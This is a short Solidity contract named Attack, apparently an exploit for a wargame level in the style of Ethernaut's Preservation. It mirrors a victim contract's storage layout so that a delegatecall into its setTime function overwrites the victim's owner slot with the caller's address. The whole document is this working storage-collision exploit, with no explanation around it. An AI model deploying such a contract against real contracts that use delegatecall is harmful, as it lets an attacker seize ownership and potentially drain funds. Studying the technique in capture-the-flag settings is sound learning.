// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;


contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint256 storedTime;

    function setTime(uint256 time) external { 
        owner = msg.sender;
    }
}